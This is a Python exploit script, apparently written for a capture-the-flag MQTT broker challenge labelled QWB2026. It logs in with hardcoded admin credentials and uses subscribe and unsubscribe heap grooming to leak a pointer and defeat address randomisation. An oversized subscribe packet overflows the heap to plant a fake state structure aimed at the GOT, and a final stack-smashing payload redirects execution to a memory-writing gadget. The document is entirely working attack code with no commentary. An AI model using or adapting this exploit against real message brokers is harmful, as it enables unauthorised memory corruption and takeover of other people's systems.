import socket, struct, time, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2]); MODE=sys.argv[3] if len(sys.argv)>3 else 'test'
BIN2HEAP=0x220f0; STATE_VAR=0x20330; TABLE_VAR=0x20338; TABLE_ARR=0x20340
def varint(n):
    o=b''
    while True:
        b=n%128;n//=128
        if n:o+=bytes([b|0x80])
        else:o+=bytes([b]);break
    return o
def sstr(x):
    if isinstance(x,str): x=x.encode()
    return struct.pack('>H',len(x)&0xffff)+x
def pkt(t,body,forced=None): return bytes([t])+varint(len(body) if forced is None else forced)+body
s=socket.create_connection((HOST,PORT),10); s.settimeout(3)
def tx(b): s.sendall(b)
def rx(t=0.5):
    s.settimeout(t); out=b''
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            out+=d
    except Exception: pass
    return out
body=sstr('MQTT')+bytes([4,0xC2])+struct.pack('>H',0x4321)+sstr('QWB_Client')+sstr('QWB2026_Admin')+sstr('hn5ne')
tx(pkt(0x10,body)); time.sleep(0.5); r=rx(1.0)
print('[auth]',r.hex())
assert b'\x20\x02\x00\x00' in r
def sub(topic=None,raw=None,pl=None,t=0.4):
    if raw is None: body=struct.pack('>H',1)+sstr(topic)
    else: body=struct.pack('>H',1)+struct.pack('>H',raw)+pl
    tx(pkt(0x82,body,forced=len(body))); time.sleep(0.15); return rx(t)
def unsub(topic,t=0.4):
    tx(pkt(0xA2,struct.pack(">H",1)+sstr(topic))); time.sleep(0.15); return rx(t)
# leak
sub('d1zz'); sub('d2zz'); sub('d3zz')
sub(b'A'*30); sub(b'B'*30); sub('QWB2026_News')
unsub(b'A'*30); unsub(b'B'*30)
for _ in range(6):
    tx(b'\xc0\x00'); rx(0.3)
r=pub=None
tx(pkt(0x30,sstr('QWB2026_News')+b'C'*30)); time.sleep(0.5); r=rx(0.8)
leak=None
i=r.find(b'\x34\x2e\x00\x0cQWB2026_News')
if i>=0:
    bd=r[i+2:i+2+0x2e]; tl=struct.unpack('>H',bd[0:2])[0]
    leak=struct.unpack('>Q',bd[2+tl+2:][:8])[0]
print('[leak]',hex(leak) if leak else None)
assert leak
BASE=leak-BIN2HEAP
print('[base]',hex(BASE))
FAKE=BASE+0x221a0
# fake state: byte0=len(0 for test), byte1=auth, byte2=news, byte3=ping
st=bytearray(136)
st[0]=0x00 if MODE=='test' else 0x50
st[1]=0x00 if MODE=='test' else 0x01
st[2]=0x01; st[3]=0x06
for i in range(4,0x54): st[i]=0
if MODE!='test':
    st[4]=0xE0   # buf[0] = DISCONNECT
    st[5]=0x00   # RL=0
# fake frame at +0x60
fr=0x60
st[fr+0:fr+8]=struct.pack('>Q',0x288)        # len
st[fr+16:fr+24]=struct.pack('>Q',BASE+0x20060) # buf = GOT
st[fr+32:fr+40]=struct.pack('>Q',1)           # fd=1
print('[fake]',hex(FAKE),'alloc')
print('  sub fake:',sub(bytes(st)).hex())
# shaping
sub('/bin/sh'); sub('d1xx'); sub('d2xx'); sub('Xx'); sub('Yy'); sub('Z'*400)
unsub('Yy'); unsub('Xx')
pl=bytearray(b'A'*272); pl[24:32]=struct.pack('>Q',0x21); pl[32:40]=struct.pack('>Q',(BASE+STATE_VAR)-16)
print('  ovf1:',sub(raw=0xFFFF,pl=bytes(pl)).hex())
print('  pop1:',sub('AAAA').hex())
# write state pointer via overflow handler (writes 272 bytes at STATE_VAR)
stpl=bytearray(272)
stpl[0:8]=struct.pack('>Q',FAKE)
stpl[8:16]=struct.pack('>Q',BASE+TABLE_ARR)
print('  ovf2:',sub(raw=0xFFFF,pl=bytes(stpl)).hex())
time.sleep(0.3)
if MODE=='test':
    print('[test] subscribe should be gated (no SUBACK):', sub('hello').hex())
    print('[test] ping still works:', (tx(b'\xc0\x00'), time.sleep(0.3), rx(0.4))[2].hex())
else:
    # smash: dispatcher will read with huge count; send payload
    pay=bytearray(b'S'*0x17ff0)
    pay[0x17fd8:0x17fe0]=struct.pack('>Q',BASE+0x28050)   # gp
    pay[0x17fe0:0x17fe8]=struct.pack('>Q',FAKE+0x60)       # s8 = fake frame
    pay[0x17fe8:0x17ff0]=struct.pack('>Q',BASE+0x3114)     # ra = write_all gadget
    tx(bytes(pay)); time.sleep(1.0)
    out=rx(2.0)
    print('[smash out]',len(out),out[:64].hex())
